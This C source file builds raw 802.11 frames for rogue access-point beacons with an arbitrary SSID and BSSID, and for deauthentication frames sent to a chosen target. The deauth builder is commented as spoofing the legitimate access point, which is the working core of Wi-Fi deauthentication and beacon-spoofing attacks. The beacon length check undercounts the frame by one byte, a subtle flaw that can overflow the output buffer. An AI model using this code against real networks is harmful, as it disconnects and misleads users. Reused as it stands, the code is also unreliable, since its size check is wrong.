#include "frame_builder.h"
#include <string.h>
#include <stdint.h>

// 802.11 Management frame control: type=0 (mgmt), subtype=8 (beacon) = 0x0080
// Deauth: type=0 (mgmt), subtype=12 (deauth) = 0x00C0
// Frame layout (no FCS): FC(2) Dur(2) Addr1(6) Addr2(6) Addr3(6) SeqCtrl(2) [Body]

size_t build_beacon_frame(uint8_t* out, size_t cap,
                          const uint8_t bssid[6], const char* ssid, uint8_t channel) {
    size_t ssid_len = strlen(ssid);
    // Minimum beacon body: timestamp(8) + interval(2) + capinfo(2) + SSID IE + rates IE + DS IE
    size_t body_len = 8 + 2 + 2 + 2 + ssid_len + 2 + 3 + 3;
    size_t total = 2 + 2 + 6 + 6 + 6 + 2 + body_len;
    if (total > cap) return 0;

    size_t i = 0;
    // Frame Control: beacon
    out[i++] = 0x80; out[i++] = 0x00;
    // Duration
    out[i++] = 0x00; out[i++] = 0x00;
    // Addr1 (dst): broadcast
    memset(out + i, 0xFF, 6); i += 6;
    // Addr2 (src): bssid
    memcpy(out + i, bssid, 6); i += 6;
    // Addr3 (bssid)
    memcpy(out + i, bssid, 6); i += 6;
    // Sequence control
    out[i++] = 0x00; out[i++] = 0x00;
    // Timestamp (8 bytes, zero)
    memset(out + i, 0, 8); i += 8;
    // Beacon interval: 100 TU = 0x6400 LE
    out[i++] = 0x64; out[i++] = 0x00;
    // Capability info: ESS + short preamble = 0x0431
    out[i++] = 0x31; out[i++] = 0x04;
    // SSID IE (ID=0)
    out[i++] = 0x00;
    out[i++] = (uint8_t)ssid_len;
    memcpy(out + i, ssid, ssid_len); i += ssid_len;
    // Supported rates IE (ID=1): 1, 2, 5.5, 11 Mbps
    out[i++] = 0x01; out[i++] = 0x04;
    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8B; out[i++] = 0x96;
    // DS Parameter Set IE (ID=3): channel
    out[i++] = 0x03; out[i++] = 0x01; out[i++] = channel;

    return i;
}

size_t build_deauth_frame(uint8_t* out, size_t cap,
                          const uint8_t target[6], const uint8_t bssid[6], uint16_t reason) {
    size_t total = 2 + 2 + 6 + 6 + 6 + 2 + 2;  // header + reason code
    if (total > cap) return 0;

    size_t i = 0;
    // Frame Control: deauth (0xC000)
    out[i++] = 0xC0; out[i++] = 0x00;
    // Duration
    out[i++] = 0x00; out[i++] = 0x00;
    // Addr1 (dst): target
    memcpy(out + i, target, 6); i += 6;
    // Addr2 (src): bssid (spoofed as legitimate AP)
    memcpy(out + i, bssid, 6); i += 6;
    // Addr3 (bssid)
    memcpy(out + i, bssid, 6); i += 6;
    // Sequence control
    out[i++] = 0x00; out[i++] = 0x00;
    // Reason code LE
    out[i++] = (uint8_t)(reason & 0xFF);
    out[i++] = (uint8_t)(reason >> 8);

    return i;
}
